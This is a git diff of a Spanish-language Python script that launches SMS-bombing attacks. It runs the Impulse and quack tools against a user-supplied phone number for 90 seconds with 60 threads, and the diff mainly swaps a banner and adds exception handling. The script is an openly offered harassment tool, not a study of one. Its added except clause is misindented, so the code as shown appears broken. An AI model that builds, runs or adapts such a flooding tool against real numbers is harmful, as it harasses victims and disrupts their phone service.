@@ -37,19 +37,14 @@ sleep(1.5)
 print (f"comenzando el ataque al numero: {numero}")
 def attack():
     os.system("clear")
-    banner2 = """
-       _____   __    __                 __    
-      /  _  \_/  |__/  |______    ____ |  | __
-     /  /_\  \   __\   __\__  \ _/ ___\|  |/ /
-    /    |    \  |  |  |  / __ \\  \___|    < 
-    \____|__  /__|  |__| (____  /\___  >__|_ \
-            \/                \/     \/     \/
-    """
-    print (verde+banner2)
+    msj = "Comenzando ataque..."
+    print (verde+msj)
     print (reset+"")
-    sleep(1)
-    os.system(f"cd ataque && cd quack && cd Impulse && python impulse.py --method SMS --time 90 --threads 60 --target {numero}")
-    os.system(f"cd ataque && cd quack && cd quack && python quack --tool SMS --target {numero} --threads 60 --timeout 90")
-    print ("ataque terminado.")
-
+    sleep(2)
+    try:
+        os.system(f"cd ataque && cd quack && cd Impulse && python impulse.py --method SMS --time 90 --threads 60 --target {numero}")
+        os.system(f"cd ataque && cd quack && cd quack && python quack --tool SMS --target {numero} --threads 60 --timeout 90")
+        print ("ataque terminado.")
+   except KeyboardInterrupt:
+        print (rojo+"finalizando el spam de sms...")
 attack()
